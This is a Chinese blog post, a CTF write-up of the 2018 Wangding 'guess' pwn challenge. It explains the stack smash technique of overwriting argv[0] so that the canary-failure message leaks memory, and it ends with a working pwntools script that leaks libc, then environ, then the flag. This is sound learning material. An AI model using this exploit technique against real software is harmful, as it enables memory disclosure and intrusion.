<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>2018网鼎pwn (guess复现) | Bin Fantasy🤯</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="​        2018网鼎pwn题复现与学习。">
<meta property="og:type" content="article">
<meta property="og:title" content="2018网鼎pwn (guess复现)">
<meta property="og:url" content="http://example.com/2020/04/13/guess/index.html">
<meta property="og:site_name" content="Bin Fantasy🤯">
<meta property="og:description" content="​        2018网鼎pwn题复现与学习。">
<meta property="og:locale">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNPENT.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNPFH0.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNPAEV.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNPQD1.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNPMuR.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNPlHx.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNP3E6.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNPG4O.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNPm34.png">
<meta property="og:image" content="https://s1.ax1x.com/2020/07/14/UNPeCF.png">
<meta property="article:published_time" content="2020-04-13T12:14:08.000Z">
<meta property="article:modified_time" content="2020-07-14T02:53:27.281Z">
<meta property="article:author" content="Ash3n On3">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s1.ax1x.com/2020/07/14/UNPENT.png">
  
    <link rel="alternate" href="/atom.xml" title="Bin Fantasy🤯" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  
<link rel="stylesheet" href="/css/style.css">

  
<link rel="stylesheet" href="/plugin/bganimation/bg.css">

  

  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
<meta name="generator" content="Hexo 5.4.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
    <h2 class="author">Ash3n On3</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>主页</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>归档</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分类</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>标签</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main"><article id="post-guess" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2020/04/13/guess/" class="article-date">
  <time class="post-time" datetime="2020-04-13T12:14:08.000Z" itemprop="datePublished">
    <span class="post-month">4月</span><br/>
    <span class="post-day">13</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      2018网鼎pwn (guess复现)
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>​        2018网鼎pwn题复现与学习。<span id="more"></span></p>
<p>​        因为网鼎、铁三、国赛差不多了，而且刘老板也给了建议，就决定来复现一下2018网鼎的pwn题。毕竟赛题比一般的旧题目含金量更多，能学到很多东西。</p>
<p>​        写题解之前先贴一些铺垫知识，都是这个题目会用到的，也是新学到的。</p>
<h2 id="0x00-Stack-Smash"><a href="#0x00-Stack-Smash" class="headerlink" title="0x00 . Stack Smash"></a>0x00 . Stack Smash</h2><p>​        这个技术算是栈溢出技术的一种，也收录在CTF-Wiki中。</p>
<p>​        对于开启了canary保护的程序，我们不能直接进行栈溢出，因为会破坏canary的值。</p>
<img src="https://s1.ax1x.com/2020/07/14/UNPENT.png" style="zoom:67%;" />

<p>​        如果函数返回时检查到canary被破坏了，就会跳转到__stack_chk_fail()函数开始执行。</p>
<p>​        看一下库文件中的__stack_chk_fail()及其引用函数：</p>
<p><img src="https://s1.ax1x.com/2020/07/14/UNPFH0.png"></p>
<img src="https://s1.ax1x.com/2020/07/14/UNPAEV.png" alt="image-20200412191742905" style="zoom:67%;" />

<p>​        再看一下源码(版本为glibc-2.23)：</p>
<img src="https://s1.ax1x.com/2020/07/14/UNPQD1.png" alt="image-20200412195528076" style="zoom:67%;" />

<img src="https://s1.ax1x.com/2020/07/14/UNPMuR.png" alt="image-20200412195511596" style="zoom:67%;" />

<p>​        我们可以看到，<code>__stack_chk_fail()</code>会调用<code>__fortify_fail()</code>，而后者输出了一行字符串，实际上是用来提示用户该程序出错，而__libc_argv[0]中存的就是程序名。</p>
<p>​        而该变量作为命令行参数，存在main函数的栈帧上，也就是说，如果我们在栈上可以进行足够长的输入，就能覆盖canary，再将想要泄露的target_addr覆盖argv[0]，此时系统监测到溢出，执行<code>__stack_chk_fail()</code>和<code>__fortify_fail()</code>就能输出target_get的内容。</p>
<p>​        用这样的栈溢出理论上实现了任意读（满足读权限），但是泄露了之后系统就关闭进程，无法继续攻击。</p>
<h2 id="0x01-Linux-父子进程"><a href="#0x01-Linux-父子进程" class="headerlink" title="0x01 . Linux 父子进程"></a>0x01 . Linux 父子进程</h2><p>​        在linux程序中，一般用fork函数来创建一个新的子进程。</p>
<p><img src="https://s1.ax1x.com/2020/07/14/UNPlHx.png"></p>
<p>​        这个新的子进程理论上算是原进程的一个副本，执行fork()时，系统先为子进程分配资源，再将原进程的一系列数据和变量复制到子进程中。这个复制的结果是，数据和变量的值都一样，在系统中的虚拟地址是一样的，但是物理地址不同，也就是说将数据复制到了另一个物理地址，即副本。</p>
<p>​        而新进程原进程在fork()执行之后，返回值为子进程的id。那么对于v1变量，原进程的值为子进程的id，子进程没有子进程，v1自然为0。如果返回值为-1，即创建进程失败。</p>
<p>​        当fork()执行结束，父子进程的下一行代码都是if(v1 == -1)，都从这里开始执行。</p>
<h2 id="0x02-GUESS"><a href="#0x02-GUESS" class="headerlink" title="0x02 . GUESS"></a>0x02 . GUESS</h2><h3 id="A-Analysis"><a href="#A-Analysis" class="headerlink" title="A . Analysis"></a>A . Analysis</h3><p>​        用ida打开文件可以看见，程序一开始就将flag.txt读取到了栈上:</p>
<img src="https://s1.ax1x.com/2020/07/14/UNP3E6.png" alt="image-20200413155246955" style="zoom: 80%;" />

<p>​        不过程序中存在canary保护。</p>
<img src="https://s1.ax1x.com/2020/07/14/UNPG4O.png" alt="image-20200413155332703" style="zoom:80%;" />

<p>​        跑一下，其实就是让你输入flag。输入AAAAAAAA。</p>
<p>​        gdb调试看看栈上的情况，可以看到flag的确在栈上（此处用了本地的flag）。</p>
<p><img src="https://s1.ax1x.com/2020/07/14/UNPm34.png" alt="1"></p>
<p>​        可以得知以下部分变量的地址。</p>
<table>
<thead>
<tr>
<th align="center">Variable</th>
<th align="center">Addr</th>
</tr>
</thead>
<tbody><tr>
<td align="center">argv[0]</td>
<td align="center">0x7fffffffdd88</td>
</tr>
<tr>
<td align="center">flag.txt</td>
<td align="center">0x7fffffffdc30</td>
</tr>
<tr>
<td align="center">User Input</td>
<td align="center">0x7fffffffdc60</td>
</tr>
</tbody></table>
<p>​        其中argv[0]为命令行参数，存的是程序路径及程序名“GUESS”。之所以要提到argv[0]是因为此处可以用到本文上述的花式栈溢出技巧stack smash。因为程序中的用户输入是用gets()实现的，因此用我们可以用input将足够长的padding和puts的got表值覆盖到argv[0]，从而泄露libc基址。(0xdd88 - 0xdc60 == 0x128)</p>
<p>​        得到了libc的地址，我们还需要泄露另一个变量environ。这个变量存的是程序的栈基址，我们可以根据flag.txt在栈上的固定偏移，来确定flag的实际地址。environ变量被存在符号表中，所以也可以通过上述的stack smash泄露got表的方式得到。</p>
<p>​        gdb下断点得到当前的栈地址。</p>
<p><img src="https://s1.ax1x.com/2020/07/14/UNPeCF.png" alt="2"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">environ - flag_aar == <span class="number">0x168</span></span><br><span class="line">environ - <span class="number">0x168</span> == flag_aar</span><br></pre></td></tr></table></figure>

<p>​        现在只要再一次进行stack smash泄露出栈上的flag即可。</p>
<h3 id="B-Exploit"><a href="#B-Exploit" class="headerlink" title="B . Exploit"></a>B . Exploit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./guess&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./guess&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x128</span> * <span class="string">&#x27;B&#x27;</span> + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag&quot;</span>,payload)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">puts_gots = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts_gots : &quot;</span> + <span class="built_in">hex</span>(puts_gots)</span><br><span class="line"></span><br><span class="line">libc_addr = puts_gots - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;libc_addr : &quot;</span> + <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">stack_addr = libc_addr + libc.symbols[<span class="string">&#x27;environ&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x128</span> * <span class="string">&#x27;B&#x27;</span> + p64(stack_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">stack_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;stack_addr : &quot;</span> + <span class="built_in">hex</span>(stack_addr)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x128</span> * <span class="string">&#x27;C&#x27;</span> + p64(stack_addr - <span class="number">0x168</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Please type your guessing flag&quot;</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;*** stack smashing detected ***: &quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2020/04/13/guess/" data-id="ckmlis0z8000cs0lj8w5hcw57" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
    
<nav id="article-nav">
  
    <a href="/2020/07/07/sandbox/" id="article-nav-newer" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Newer</strong>
      <div class="article-nav-title">
        
          Seccomp Sandbox (ORW)
        
      </div>
    </a>
  
  
    <a href="/2020/04/09/Vtable-Hijack(the_end)/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">Vtable-Hijack(the_end)</div>
    </a>
  
</nav>

  
</article>



</section>
        
          <aside id="sidebar">
  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <h1 class="blog-title">Bin Fantasy🤯</h1>
    <h2 class="blog-subtitle">You may found nothing here.</h2>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>主页</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>归档</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分类</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>标签</li>
          </a>
        
    </ul>
  </div>
</div>

  
    <div class="widget-wrap">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
    <h2 class="author">Ash3n On3</h2>
    <h3 class="description"></h3>
    <div class="count-box">
      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
    </div>



    <div class="social-link">
      
        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
          Github
        </a>
      
    </div>

    <div class="friend-link">
      <h2>友链</h2>
      
        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
          ShanaMaid
        </a>
      
    </div>
  </div>
</div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy;2020 - 2021 Ash3n On3<br>
      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
      
    </div>
    
  </div>
</footer>
    </div>
    

<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
<script>
new WOW().init();
</script>   


  
<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">

  
<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>




  <section class="hidden-xs"> 
  <ul class="cb-slideshow"> 
    <li><span>苟利</span></li> 
    <li><span>国家</span></li> 
    <li><span>生死以</span></li> 
    <li><span>岂能</span></li> 
    <li><span>祸福</span></li> 
    <li><span>趋避之</span></li> 
  </ul>
</section>

<script src="/js/script.js"></script>




  </div>
</body>
</html>